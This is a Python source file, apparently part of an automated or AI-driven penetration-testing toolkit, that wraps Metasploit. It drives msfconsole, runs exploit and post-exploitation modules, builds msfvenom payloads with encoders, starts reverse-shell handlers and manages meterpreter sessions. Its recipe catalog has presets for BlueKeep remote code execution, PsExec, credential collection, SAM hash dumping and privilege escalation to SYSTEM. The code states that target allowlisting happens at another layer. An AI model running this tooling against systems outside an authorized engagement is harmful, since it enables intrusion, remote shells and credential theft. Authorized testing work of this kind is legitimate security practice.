"""Metasploit bridge for interactive msfconsole and meterpreter session management.

Provides:
- MsfconsoleSession: interactive msfconsole in a tmux session
- MeterpreterSession: interact with specific meterpreter/shell sessions
- ModuleRunner: run modules and track results
- PayloadGenerator: msfvenom wrapper
- ResourceScript: generate and run msfconsole resource scripts
- SessionParser: parse msfconsole output to extract session info
"""

from __future__ import annotations

import json
import logging
import os
import re
import shlex
import shutil
import subprocess
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext
from tools.attack_modules.registry import register_attack_module
from tools.persistent_session_manager import PersistentSessionManager, get_session_manager

_LOG = logging.getLogger(__name__)

# Matches the interactive msfconsole prompt (``msf6 >``, ``msf6 exploit(...) >``,
# ``msf6 auxiliary(...) >``). Used by ``MsfconsoleSession._wait_for_prompt`` to
# detect readiness instead of blind ``time.sleep`` handshakes.
_MSF_PROMPT_RE = re.compile(r"msf\d*\s*[>\)]")


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class MsfSessionInfo:
    session_id: int
    session_type: str  # 'meterpreter', 'shell', 'cmd'
    target_ip: str
    target_port: int
    local_ip: str
    local_port: int
    platform: str
    info: str = ""
    via_exploit: str = ""
    via_payload: str = ""
    opened_at: float = field(default_factory=time.time)
    last_activity: float = field(default_factory=time.time)
    status: str = "active"  # active, dead, backgrounded

    def to_dict(self) -> dict[str, Any]:
        return {
            "session_id": self.session_id,
            "session_type": self.session_type,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "local_ip": self.local_ip,
            "local_port": self.local_port,
            "platform": self.platform,
            "info": self.info,
            "via_exploit": self.via_exploit,
            "via_payload": self.via_payload,
            "opened_at": self.opened_at,
            "last_activity": self.last_activity,
            "status": self.status,
        }


@dataclass
class MsfModuleResult:
    module: str
    target_ip: str
    status: str
    output: str
    session_created: MsfSessionInfo | None = None
    error: str = ""
    duration_seconds: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        return {
            "module": self.module,
            "target_ip": self.target_ip,
            "status": self.status,
            "output": self.output,
            "session_created": self.session_created.to_dict() if self.session_created else None,
            "error": self.error,
            "duration_seconds": self.duration_seconds,
        }


# ---------------------------------------------------------------------------
# Session output parser
# ---------------------------------------------------------------------------


class MsfSessionParser:
    """Parse msfconsole output to extract session information."""

    @staticmethod
    def parse_sessions_list(output: str) -> list[MsfSessionInfo]:
        """Parse 'sessions -l' output to extract session details."""
        sessions = []
        # Match lines like:
        #   1  meterpreter x64/win64  192.168.1.10:4444 -> 192.168.1.50:49231 (DESKTOP-ABC123\user)
        pattern = re.compile(
            r"\s*(\d+)\s+(\S+)\s+(\S+)\s+"
            r"(\d+\.\d+\.\d+\.\d+):(\d+)\s*-\u003e\s*"
            r"(\d+\.\d+\.\d+\.\d+):(\d+)\s*\(([^)]+)\)"
        )
        for match in pattern.finditer(output):
            sessions.append(
                MsfSessionInfo(
                    session_id=int(match.group(1)),
                    session_type=match.group(2),
                    platform=match.group(3),
                    local_ip=match.group(4),
                    local_port=int(match.group(5)),
                    target_ip=match.group(6),
                    target_port=int(match.group(7)),
                    info=match.group(8),
                )
            )
        return sessions

    @staticmethod
    def parse_session_created(output: str) -> MsfSessionInfo | None:
        """Parse output for 'Meterpreter session X opened' or similar."""
        # Match: "Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49231)"
        pattern = re.compile(
            r"(\w+)\s+session\s+(\d+)\s+opened\s*\("
            r"(\d+\.\d+\.\d+\.\d+):(\d+)\s*-\u003e\s*"
            r"(\d+\.\d+\.\d+\.\d+):(\d+)\)"
        )
        match = pattern.search(output)
        if match:
            return MsfSessionInfo(
                session_id=int(match.group(2)),
                session_type=match.group(1).lower(),
                local_ip=match.group(3),
                local_port=int(match.group(4)),
                target_ip=match.group(5),
                target_port=int(match.group(6)),
            )

        # Alternative: "[*] Sending stage (200262 bytes) to 192.168.1.50"
        # Then look for session opened after
        stage_pattern = re.compile(r"Sending stage .* to (\d+\.\d+\.\d+\.\d+)")
        stage_match = stage_pattern.search(output)
        if stage_match:
            # Try to find session number nearby
            session_pattern = re.compile(r"session\s+(\d+)\s+opened")
            session_match = session_pattern.search(output)
            if session_match:
                return MsfSessionInfo(
                    session_id=int(session_match.group(1)),
                    session_type="meterpreter",
                    target_ip=stage_match.group(1),
                    target_port=0,
                    local_ip="",
                    local_port=0,
                )
        return None

    @staticmethod
    def parse_exploit_result(output: str) -> dict[str, Any]:
        """Parse exploit execution result for success/failure indicators."""
        result = {
            "success": False,
            "session_opened": False,
            "session_id": None,
            "error": None,
            "output": output,
        }

        # Success indicators
        if "session opened" in output.lower():
            result["success"] = True
            result["session_opened"] = True
            session_match = re.search(r"session\s+(\d+)\s+opened", output, re.IGNORECASE)
            if session_match:
                result["session_id"] = int(session_match.group(1))

        # Failure indicators
        failure_patterns = [
            r"exploit completed, but no session was created",
            r"exploit failed",
            r"target is not vulnerable",
            r"no payload configured",
            r"check failed",
        ]
        for pattern in failure_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                result["success"] = False
                result["error"] = pattern
                break

        return result


# ---------------------------------------------------------------------------
# Msfconsole session
# ---------------------------------------------------------------------------


class MsfconsoleSession:
    """Manages an interactive msfconsole session via tmux."""

    def __init__(self, workspace: Path, session_manager: PersistentSessionManager | None = None) -> None:
        self.workspace = workspace
        self.workspace.mkdir(parents=True, exist_ok=True)
        self._sm = session_manager or get_session_manager(workspace)
        self._session_name = "msfconsole_main"
        self._parser = MsfSessionParser()
        self._lock = threading.Lock()

    def is_running(self) -> bool:
        """Check if msfconsole is running."""
        info = self._sm.get_session(self._session_name)
        if info:
            return info.get("running", False)
        return False

    def start(self) -> dict[str, Any]:
        """Start msfconsole in a tmux session."""
        if self.is_running():
            return {"success": True, "message": "msfconsole is already running", "name": self._session_name}

        # Check if msfconsole is available
        if not shutil.which("msfconsole"):
            return {
                "success": False,
                "error": "msfconsole not found. Install metasploit-framework: apt install metasploit-framework",
            }

        # Start msfconsole with quiet mode and no banner
        cmd = "msfconsole -q -n"
        result = self._sm.start_tmux_session(self._session_name, cmd, cwd=self.workspace)

        if not result.get("success"):
            return result

        # Wait for msfconsole to initialize: poll for the interactive prompt
        # instead of a blind sleep — cold starts can take well over 4s.
        self._send_command("version")
        if not self._wait_for_prompt(deadline_seconds=90):
            return {
                "success": False,
                "error": (
                    "msfconsole did not show a prompt within 90s (slow init — "
                    "the console may still be loading; retry start_console)"
                ),
            }
        output = self._read_output(lines=20)

        return {
            "success": True,
            "name": self._session_name,
            "message": "msfconsole started successfully",
            "initial_output": output,
        }

    def stop(self) -> dict[str, Any]:
        """Stop the msfconsole session."""
        if not self.is_running():
            return {"success": True, "message": "msfconsole was not running"}

        # Gracefully exit msfconsole
        self._send_command("exit -y")
        time.sleep(1)

        result = self._sm.kill_session(self._session_name)
        return {
            "success": result.get("success", False),
            "message": "msfconsole stopped",
        }

    def _send_command(self, command: str) -> bool:
        """Send a command to msfconsole."""
        result = self._sm.send_to_session(self._session_name, command)
        return result.get("success", False)

    def _read_output(self, lines: int = 100) -> str:
        """Read output from msfconsole."""
        result = self._sm.read_session_output(self._session_name, lines=lines)
        return result.get("output", "")

    def _wait_for_prompt(self, deadline_seconds: float = 90, poll: float = 2.0) -> bool:
        """Poll msfconsole output for the interactive prompt until ``deadline_seconds``.

        Returns True as soon as ``_MSF_PROMPT_RE`` matches, False on timeout.
        Mock-friendly: any read/match failure counts as "not ready yet", never
        raises. Worst case stalls the full deadline — equivalent to the blind
        ``time.sleep`` this replaces.
        """
        start = time.monotonic()
        while True:
            try:
                output = self._read_output(lines=20)
                if output and _MSF_PROMPT_RE.search(output):
                    return True
            except Exception:
                pass
            elapsed = time.monotonic() - start
            if elapsed >= deadline_seconds:
                return False
            delay = min(poll, deadline_seconds - elapsed)
            if delay > 0:
                time.sleep(delay)

    def execute(self, command: str, wait_seconds: float = 2.0, read_lines: int = 100) -> dict[str, Any]:
        """Execute a command in msfconsole and return output."""
        if not self.is_running():
            start_result = self.start()
            if not start_result.get("success"):
                return start_result

        with self._lock:
            success = self._send_command(command)
            if not success:
                return {"success": False, "error": f"Failed to send command: {command}"}

            self._wait_for_prompt(deadline_seconds=wait_seconds)
            output = self._read_output(lines=read_lines)

        return {
            "success": True,
            "command": command,
            "output": output,
        }

    def run_module(
        self,
        module: str,
        target_ip: str,
        options: dict[str, str] | None = None,
        payload: str = "",
        wait_seconds: float = 30.0,
    ) -> MsfModuleResult:
        """Run a Metasploit module against a target."""
        start_time = time.monotonic()

        if not self.is_running():
            start_result = self.start()
            if not start_result.get("success"):
                return MsfModuleResult(
                    module=module,
                    target_ip=target_ip,
                    status="failed",
                    output="",
                    error=start_result.get("error", "Failed to start msfconsole"),
                )

        # Build the command sequence
        commands = [
            f"use {module}",
            f"set RHOSTS {target_ip}",
        ]

        if options:
            for key, value in options.items():
                if key.upper() != "RHOSTS":
                    commands.append(f"set {key} {value}")

        if payload:
            commands.append(f"set PAYLOAD {payload}")

        commands.append("exploit -z")  # -z backgrounds the session if one is created

        # Execute commands
        with self._lock:
            for cmd in commands:
                self._send_command(cmd)
                self._wait_for_prompt(deadline_seconds=0.5, poll=0.5)

            # Wait for exploit to complete
            self._wait_for_prompt(deadline_seconds=wait_seconds)
            output = self._read_output(lines=200)

        duration = time.monotonic() - start_time
        parsed = self._parser.parse_exploit_result(output)

        session_info = None
        if parsed["session_opened"] and parsed["session_id"] is not None:
            session_info = MsfSessionInfo(
                session_id=parsed["session_id"],
                session_type="meterpreter",
                target_ip=target_ip,
                target_port=0,
                local_ip="",
                local_port=0,
                via_exploit=module,
                via_payload=payload,
            )

        return MsfModuleResult(
            module=module,
            target_ip=target_ip,
            status="success" if parsed["success"] else "failed",
            output=output,
            session_created=session_info,
            error=parsed.get("error", ""),
            duration_seconds=duration,
        )

    def list_sessions(self) -> list[MsfSessionInfo]:
        """List active Metasploit sessions."""
        if not self.is_running():
            return []

        result = self.execute("sessions -l", wait_seconds=2.0, read_lines=50)
        if not result.get("success"):
            return []

        return self._parser.parse_sessions_list(result["output"])

    def interact_session(
        self, session_id: int, command: str, wait_seconds: float = 3.0, background_key: str = "background"
    ) -> dict[str, Any]:
        """Send a command to a specific meterpreter/shell session.

        ``background_key`` is the keystroke used to return to the msfconsole
        prompt after running ``command``. Meterpreter accepts the literal
        ``background`` command, but shell/cmd sessions do not — for those the
        caller should pass ``"C-z"`` so tmux sends a raw Ctrl-Z.
        """
        if not self.is_running():
            return {"success": False, "error": "msfconsole is not running"}

        with self._lock:
            # Switch to the session
            self._send_command(f"sessions -i {session_id}")
            time.sleep(1)

            # Send the command
            self._send_command(command)
            time.sleep(wait_seconds)

            # Background the session to return to the main msfconsole prompt.
            # ``background`` is a meterpreter command; for shell/cmd sessions a
            # raw Ctrl-Z (tmux key "C-z") is required instead.
            self._send_command(background_key)
            time.sleep(0.5)

            output = self._read_output(lines=150)

        return {
            "success": True,
            "session_id": session_id,
            "command": command,
            "output": output,
        }

    def run_post_module(self, module: str, session_id: int, options: dict[str, str] | None = None) -> dict[str, Any]:
        """Run a post-exploitation module against a specific session."""
        if not self.is_running():
            return {"success": False, "error": "msfconsole is not running"}

        commands = [
            f"use {module}",
            f"set SESSION {session_id}",
        ]

        if options:
            for key, value in options.items():
                if key.upper() != "SESSION":
                    commands.append(f"set {key} {value}")

        commands.append("run")

        with self._lock:
            for cmd in commands:
                self._send_command(cmd)
                time.sleep(0.5)

            time.sleep(5)
            output = self._read_output(lines=200)

        return {
            "success": True,
            "module": module,
            "session_id": session_id,
            "output": output,
        }

    def run_resource_script(self, script_content: str) -> dict[str, Any]:
        """Create and run a resource script in msfconsole."""
        script_path = self.workspace / "msf_resource.rc"
        script_path.write_text(script_content, encoding="utf-8")

        if not self.is_running():
            start_result = self.start()
            if not start_result.get("success"):
                return start_result

        result = self.execute(f"resource {script_path}", wait_seconds=10.0, read_lines=200)
        return result


# ---------------------------------------------------------------------------
# Payload generator
# ---------------------------------------------------------------------------


class MsfPayloadGenerator:
    """Generate payloads using msfvenom."""

    def __init__(self, workspace: Path) -> None:
        self.workspace = workspace
        self.workspace.mkdir(parents=True, exist_ok=True)

    def generate(
        self,
        payload_type: str,
        lhost: str,
        lport: int = 4444,
        fmt: str = "exe",
        platform: str = "windows",
        arch: str = "x64",
        options: str = "",
        encoder: str = "",
        iterations: int = 1,
        badchars: str = "",
    ) -> dict[str, Any]:
        """Generate a payload using msfvenom."""
        if not shutil.which("msfvenom"):
            return {"success": False, "error": "msfvenom not found. Install metasploit-framework."}

        attempt_dir = self.workspace / f"payload_{int(time.time())}"
        attempt_dir.mkdir(parents=True, exist_ok=True)

        out_file = attempt_dir / f"payload.{fmt.replace('python', 'py').replace('csharp', 'cs')}"

        cmd_parts = [
            "msfvenom",
            "-p",
            f"{platform}/{arch}/{payload_type}",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f",
            fmt,
        ]

        if options.strip():
            try:
                cmd_parts.extend(shlex.split(options))
            except ValueError as exc:
                # Unbalanced quotes / malformed shell-like input
                return {
                    "success": False,
                    "status": "error",
                    "error": f"Invalid options string (unbalanced quotes?): {exc}",
                }

        if encoder:
            cmd_parts.extend(["-e", encoder, "-i", str(iterations)])

        if badchars:
            cmd_parts.extend(["-b", badchars])

        cmd_parts.extend(["-o", str(out_file)])

        cmd = " ".join(cmd_parts)
        log_path = attempt_dir / "msfvenom.log"

        start = time.monotonic()
        try:
            proc = subprocess.run(
                cmd_parts,
                capture_output=True,
                text=True,
                timeout=300,
            )
            output = (proc.stdout + "\n" + proc.stderr)[-3000:]
            status = "completed" if proc.returncode == 0 else "failed"
        except subprocess.TimeoutExpired:
            status = "timed_out"
            output = "msfvenom timed out after 300s"
            proc = None  # type: ignore[assignment]
        except Exception as exc:
            status = "error"
            output = str(exc)
            proc = None  # type: ignore[assignment]

        elapsed = time.monotonic() - start
        file_size = out_file.stat().st_size if out_file.exists() else 0

        return {
            "success": status == "completed",
            "status": status,
            "command": cmd,
            "file": str(out_file),
            "file_size": file_size,
            "duration": elapsed,
            "output": output,
        }

    def list_payloads(self, platform: str = "", arch: str = "", keyword: str = "") -> list[str]:
        """List available msfvenom payloads."""
        if not shutil.which("msfvenom"):
            return []

        cmd = ["msfvenom", "-l", "payloads"]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            lines = result.stdout.splitlines()
            payloads = []
            for line in lines:
                # Payload lines typically look like:
                # windows/x64/meterpreter/reverse_tcp
                if "/" in line and not line.startswith(" "):
                    payload = line.split()[0]
                    if platform and not payload.startswith(platform):
                        continue
                    if arch and arch not in payload:
                        continue
                    if keyword and keyword not in payload:
                        continue
                    payloads.append(payload)
            return payloads
        except Exception:
            return []


# ---------------------------------------------------------------------------
# Main MetasploitBridge
# ---------------------------------------------------------------------------


class MetasploitBridge:
    """Unified bridge for all Metasploit interactions."""

    def __init__(self, workspace: Path, session_manager: PersistentSessionManager | None = None) -> None:
        self.workspace = workspace
        self.workspace.mkdir(parents=True, exist_ok=True)
        self._sm = session_manager or get_session_manager(workspace)
        self._console = MsfconsoleSession(workspace, self._sm)
        self._payloads = MsfPayloadGenerator(workspace)
        self._parser = MsfSessionParser()
        self._state_path = workspace / "metasploit_state.json"
        self._sessions: dict[int, MsfSessionInfo] = {}
        self._lock = threading.Lock()
        self._load_state()

    def _load_state(self) -> None:
        if not self._state_path.exists():
            return
        try:
            data = json.loads(self._state_path.read_text(encoding="utf-8"))
            for sid, info in data.get("sessions", {}).items():
                self._sessions[int(sid)] = MsfSessionInfo(
                    session_id=int(sid),
                    session_type=info.get("session_type", "meterpreter"),
                    target_ip=info.get("target_ip", ""),
                    target_port=info.get("target_port", 0),
                    local_ip=info.get("local_ip", ""),
                    local_port=info.get("local_port", 0),
                    platform=info.get("platform", ""),
                    info=info.get("info", ""),
                    via_exploit=info.get("via_exploit", ""),
                    via_payload=info.get("via_payload", ""),
                    opened_at=info.get("opened_at", 0),
                    last_activity=info.get("last_activity", 0),
                    status=info.get("status", "active"),
                )
        except (json.JSONDecodeError, KeyError, TypeError) as exc:
            # Silent pass would reset the in-memory session map to empty, and the
            # next _save_state() would overwrite the corrupt file with that empty
            # state -- dropping every tracked MSF session with no operator signal.
            _LOG.warning(
                "Metasploit session state at %s is corrupt (%s); starting with "
                "no tracked sessions. The file will be overwritten on the next "
                "state save.",
                self._state_path,
                exc,
            )

    def _save_state(self) -> None:
        data = {
            "saved_at": datetime.now(timezone.utc).isoformat(),
            "sessions": {str(sid): info.to_dict() for sid, info in self._sessions.items()},
        }
        # Atomic write (temp + os.replace, same directory => same filesystem):
        # a plain write_text truncates first, so a crash mid-write would leave
        # the MSF session-tracking state empty/corrupt instead of the prior copy.
        tmp_path = self._state_path.with_name(self._state_path.name + ".tmp")
        tmp_path.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
        os.replace(tmp_path, self._state_path)

    def _register_session(self, info: MsfSessionInfo) -> None:
        with self._lock:
            self._sessions[info.session_id] = info
            self._save_state()

    def _update_session_activity(self, session_id: int) -> None:
        with self._lock:
            if session_id in self._sessions:
                self._sessions[session_id].last_activity = time.time()
                self._save_state()

    # ── Console management ──

    def start_console(self) -> dict[str, Any]:
        """Start the msfconsole session."""
        return self._console.start()

    def stop_console(self) -> dict[str, Any]:
        """Stop the msfconsole session."""
        return self._console.stop()

    def console_command(self, command: str, wait_seconds: float = 2.0, read_lines: int = 100) -> dict[str, Any]:
        """Execute a raw msfconsole command."""
        return self._console.execute(command, wait_seconds, read_lines)

    # ── Module execution ──

    def run_exploit(
        self,
        module: str,
        target_ip: str,
        options: dict[str, str] | None = None,
        payload: str = "",
        wait_seconds: float = 30.0,
    ) -> dict[str, Any]:
        """Run an exploit module against a target."""
        result = self._console.run_module(module, target_ip, options, payload, wait_seconds)

        if result.session_created:
            self._register_session(result.session_created)

        return result.to_dict()

    def run_auxiliary(
        self,
        module: str,
        target_ip: str,
        options: dict[str, str] | None = None,
        wait_seconds: float = 15.0,
    ) -> dict[str, Any]:
        """Run an auxiliary module (scanner, fuzzer, etc.)."""
        if not self._console.is_running():
            start_result = self.start_console()
            if not start_result.get("success"):
                return start_result

        commands = [
            f"use {module}",
            f"set RHOSTS {target_ip}",
        ]
        if options:
            for key, value in options.items():
                if key.upper() != "RHOSTS":
                    commands.append(f"set {key} {value}")

        commands.append("run")

        with self._lock:
            for cmd in commands:
                self._console._send_command(cmd)
                time.sleep(0.5)

            time.sleep(wait_seconds)
            output = self._console._read_output(lines=200)

        return {
            "success": True,
            "module": module,
            "target_ip": target_ip,
            "output": output,
        }

    # ── Session interaction ──

    def list_sessions(self) -> list[dict[str, Any]]:
        """List all active Metasploit sessions."""
        # Update from live msfconsole
        live_sessions = self._console.list_sessions()
        for s in live_sessions:
            self._register_session(s)

        with self._lock:
            return [s.to_dict() for s in self._sessions.values()]

    def interact_session(self, session_id: int, command: str, wait_seconds: float = 3.0) -> dict[str, Any]:
        """Interact with a specific session."""
        # Meterpreter accepts the literal ``background`` command to return to
        # the msfconsole prompt; shell/cmd sessions do not and need a raw Ctrl-Z
        # (tmux key "C-z") instead. Branch on the tracked session type.
        with self._lock:
            info = self._sessions.get(session_id)
            session_type = info.session_type if info else ""
        if session_type in ("shell", "cmd"):
            background_key = "C-z"
        else:
            background_key = "background"
        result = self._console.interact_session(session_id, command, wait_seconds, background_key=background_key)
        self._update_session_activity(session_id)
        return result

    def run_post_module(self, module: str, session_id: int, options: dict[str, str] | None = None) -> dict[str, Any]:
        """Run a post module against a session."""
        result = self._console.run_post_module(module, session_id, options)
        self._update_session_activity(session_id)
        return result

    def background_session(self, session_id: int) -> dict[str, Any]:
        """Background a session."""
        # -d detaches/backgrounds a single session; -K would kill ALL sessions.
        result = self._console.execute(f"sessions -d {session_id}", wait_seconds=2.0)
        with self._lock:
            if session_id in self._sessions:
                self._sessions[session_id].status = "backgrounded"
                self._save_state()
        return result

    def kill_session(self, session_id: int) -> dict[str, Any]:
        """Kill a Metasploit session."""
        # -k kills a single session; -K would kill ALL sessions.
        result = self._console.execute(f"sessions -k {session_id}", wait_seconds=2.0)
        with self._lock:
            if session_id in self._sessions:
                self._sessions[session_id].status = "dead"
                self._save_state()
        return result

    # ── Payload generation ──

    def generate_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int = 4444,
        fmt: str = "exe",
        platform: str = "windows",
        arch: str = "x64",
        options: str = "",
        encoder: str = "",
        iterations: int = 1,
        badchars: str = "",
    ) -> dict[str, Any]:
        """Generate a payload using msfvenom."""
        return self._payloads.generate(
            payload_type,
            lhost,
            lport,
            fmt,
            platform,
            arch,
            options,
            encoder,
            iterations,
            badchars,
        )

    def list_payloads(self, platform: str = "", arch: str = "", keyword: str = "") -> list[str]:
        """List available payloads."""
        return self._payloads.list_payloads(platform, arch, keyword)

    # ── Resource scripts ──

    def run_resource_script(self, script_content: str) -> dict[str, Any]:
        """Run a resource script in msfconsole."""
        return self._console.run_resource_script(script_content)

    # ── Phase 3: recipe catalog + handler orchestration ──

    def run_recipe(
        self, name: str, target_ip: str = "", session_id: int = 0, options: dict[str, str] | None = None
    ) -> dict[str, Any]:
        """Dispatch a named MSF recipe (see ``MSF_RECIPES``).

        Validates the name, merges caller options over the preset, and routes
        to ``run_exploit`` / ``run_auxiliary`` / ``run_post_module`` /
        ``start_handler`` by ``kind``. Caller is responsible for allowlist-gating
        ``target_ip`` and any RHOSTS in options (done at the MCP tool layer).
        """
        recipe = MSF_RECIPES.get((name or "").strip())
        if not recipe:
            return {"success": False, "error": f"unknown MSF recipe: {name!r}"}
        opts = dict(recipe.get("options", {}))
        if options:
            opts.update(options)
        kind = recipe.get("kind", "exploit")
        module = recipe["module"]
        if kind == "auxiliary":
            return self.run_auxiliary(module, target_ip, opts)
        if kind == "post":
            sid = int(session_id or 0)
            if sid <= 0:
                return {"success": False, "error": "post recipes require a positive session_id"}
            return self.run_post_module(module, sid, opts)
        if kind == "handler":
            lport = int(opts.get("LPORT", "4444"))
            return self.start_handler(
                target_ip or "0.0.0.0", lport, recipe.get("payload", "windows/meterpreter/reverse_tcp"), opts
            )
        return self.run_exploit(module, target_ip, opts, recipe.get("payload", ""))

    def start_handler(
        self, lhost: str, lport: int, payload: str, options: dict[str, str] | None = None
    ) -> dict[str, Any]:
        """Start ``exploit/multi/handler`` as a backgrounded job (-j) in the
        persistent msfconsole -- the catch side of a generated payload. ``lhost``
        is the operator callback host (allowlist-gated at the tool layer)."""
        commands = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "set ExitOnSession false",
            "exploit -j -z",
        ]
        for k, v in (options or {}).items():
            if k.upper() not in ("PAYLOAD", "LHOST", "LPORT"):
                commands.append(f"set {k} {v}")
        return self.run_resource_script("\n".join(commands))

    def stop_handler(self) -> dict[str, Any]:
        """Stop all handler jobs in the persistent msfconsole (``jobs -K``)."""
        return self.console_command("jobs -K", wait_seconds=2.0, read_lines=50)

    def generate_exploit_resource(
        self,
        module: str,
        target_ip: str,
        payload: str,
        lhost: str,
        lport: int,
        options: dict[str, str] | None = None,
    ) -> str:
        """Generate a resource script content for automated exploitation."""
        lines = [
            f"use {module}",
            f"set RHOSTS {target_ip}",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
        ]
        if options:
            for key, value in options.items():
                if key.upper() not in ("RHOSTS", "PAYLOAD", "LHOST", "LPORT"):
                    lines.append(f"set {key} {value}")
        lines.extend(
            [
                "exploit -z",
                "sleep 5",
                "sessions -l",
            ]
        )
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Singleton / module-level instance
# ---------------------------------------------------------------------------

_bridge_instance: MetasploitBridge | None = None


def get_metasploit_bridge(workspace: Path | None = None) -> MetasploitBridge:
    """Get or create the global MetasploitBridge instance."""
    global _bridge_instance
    if _bridge_instance is None:
        ws = workspace or Path("exploit_workspace")
        _bridge_instance = MetasploitBridge(ws)
    return _bridge_instance


def reset_metasploit_bridge() -> None:
    """Reset the global instance (mainly for testing)."""
    global _bridge_instance
    _bridge_instance = None


# ---------------------------------------------------------------------------
# Phase 3: MSF recipe catalog
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Phase 3: MSF recipe catalog — AttackModule subclasses (single source)
# ---------------------------------------------------------------------------

# ponytail: recipes used to live in a parallel MSF_RECIPES dict invisible to
# find_modules/the planner. Each recipe is now an AttackModule subclass below
# (explicitly registered — auto-discovery only scans attack_modules/modules/),
# and MSF_RECIPES is a derived view, not a second source.


class _MsfRecipeModule(AttackModule):
    """Base for curated MSF module+option presets dispatchable by name.

    The recipe never executes here — run() returns an advisory info result
    pointing at the ``msf_run_recipe`` MCP tool, which allowlist-gates and
    dispatches via ``MetasploitBridge.run_recipe``. The scoring metadata is
    what makes recipes visible to find_modules/the planner.
    """

    msf_module: str = ""
    msf_kind: str = "auxiliary"  # exploit|auxiliary|post|handler
    msf_payload: str = ""
    msf_options: dict[str, str] = {}
    read_only = True
    cost = "medium"
    phase_hint = "exploit"

    @classmethod
    def recipe_dict(cls) -> dict[str, Any]:
        """The MSF_RECIPES entry shape (fresh dict per call)."""
        d: dict[str, Any] = {"module": cls.msf_module, "kind": cls.msf_kind, "description": cls.description}
        if cls.msf_payload:
            d["payload"] = cls.msf_payload
        if cls.msf_options:
            d["options"] = dict(cls.msf_options)
        return d

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                f"MSF recipe '{self.name}' ({self.msf_module}). Dispatch via "
                f"msf_run_recipe(name='{self.name}', ...) — allowlist-gated at the MCP tool layer."
            ),
            evidence=[f"MSF recipe queued: {self.msf_module} ({self.msf_kind})"],
            references=["https://docs.metasploit.com/"],
            suggested_msf=self.msf_module,
            confidence=0.4,
        )


class SmbVersionRecipe(_MsfRecipeModule):
    name = "smb_version"
    description = "SMB version + OS fingerprint via anonymous session."
    target_services = ["smb", "microsoft-ds"]
    target_ports = [445]
    msf_module = "auxiliary/scanner/smb/smb_version"
    msf_kind = "auxiliary"
    read_only = True
    cost = "low"
    phase_hint = "enumerate"


class BluekeepRecipe(_MsfRecipeModule):
    # Phase 2: the module path was a typo mixing EternalBlue's directory
    # with BlueKeep's name (exploit/windows/smb/ms17_010_bluekeep does not
    # exist in msfconsole). The real module is the RDP one.
    name = "bluekeep"
    description = "BlueKeep (CVE-2019-0708) RDP RCE."
    target_services = ["rdp", "ms-wbt-server"]
    target_ports = [3389]
    required_cves = ["CVE-2019-0708"]
    msf_module = "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    msf_kind = "exploit"
    msf_payload = "windows/x64/meterpreter/reverse_tcp"
    read_only = False
    cost = "high"


class PsexecRecipe(_MsfRecipeModule):
    name = "psexec"
    description = "PsExec-style SMB exec with supplied creds (SMBUser/SMBPass)."
    target_services = ["smb", "microsoft-ds"]
    target_ports = [445]
    requires = ["credentials"]
    msf_module = "exploit/windows/smb/psexec"
    msf_kind = "exploit"
    msf_payload = "windows/meterpreter/reverse_tcp"
    read_only = False
    cost = "high"


class CredGatherWinRecipe(_MsfRecipeModule):
    name = "cred_gather_win"
    description = "Gather Windows credentials from a session."
    target_os_hint = ["windows"]
    requires = ["foothold"]
    produces = ["credentials"]
    msf_module = "post/windows/gather/credentials/credential_collector"
    msf_kind = "post"
    read_only = False
    cost = "medium"
    phase_hint = "loot"


class LocalExploitSuggesterRecipe(_MsfRecipeModule):
    name = "local_exploit_suggester"
    description = "Suggest local privesc exploits for the active session."
    target_os_hint = ["windows", "linux"]
    requires = ["foothold"]
    msf_module = "post/multi/recon/local_exploit_suggester"
    msf_kind = "post"
    read_only = True
    cost = "low"
    phase_hint = "escalate"


class HashdumpRecipe(_MsfRecipeModule):
    name = "hashdump"
    description = "Dump SAM hashes from a Windows session."
    target_os_hint = ["windows"]
    requires = ["foothold"]
    produces = ["hash_artifact"]
    msf_module = "post/windows/gather/hashdump"
    msf_kind = "post"
    read_only = False
    cost = "medium"
    phase_hint = "loot"


class GetsystemRecipe(_MsfRecipeModule):
    name = "getsystem"
    description = "Attempt SYSTEM on a Windows meterpreter session."
    target_os_hint = ["windows"]
    requires = ["foothold"]
    produces = ["admin_priv"]
    msf_module = "post/windows/escalate/getsystem"
    msf_kind = "post"
    read_only = False
    cost = "medium"
    phase_hint = "escalate"


class HandlerRecipe(_MsfRecipeModule):
    name = "handler"
    description = "Generic multi/handler catch for a generated payload."
    msf_module = "exploit/multi/handler"
    msf_kind = "handler"
    msf_payload = "windows/meterpreter/reverse_tcp"
    read_only = True
    cost = "low"


_MSF_RECIPE_CLASSES: tuple[type[_MsfRecipeModule], ...] = (
    SmbVersionRecipe,
    BluekeepRecipe,
    PsexecRecipe,
    CredGatherWinRecipe,
    LocalExploitSuggesterRecipe,
    HashdumpRecipe,
    GetsystemRecipe,
    HandlerRecipe,
)

for _recipe_cls in _MSF_RECIPE_CLASSES:
    register_attack_module(_recipe_cls)
del _recipe_cls

# Derived view of the registered recipe classes (not a source — edit the
# classes above). Kept as a plain dict so run_recipe / get_msf_recipe / the
# msf_run_recipe MCP tool keep their existing shape.
MSF_RECIPES: dict[str, dict[str, Any]] = {c.name: c.recipe_dict() for c in _MSF_RECIPE_CLASSES}


def get_msf_recipe(name: str) -> dict[str, Any] | None:
    """Return a copy of the named recipe, or None if unknown."""
    recipe = MSF_RECIPES.get((name or "").strip())
    return dict(recipe) if recipe else None
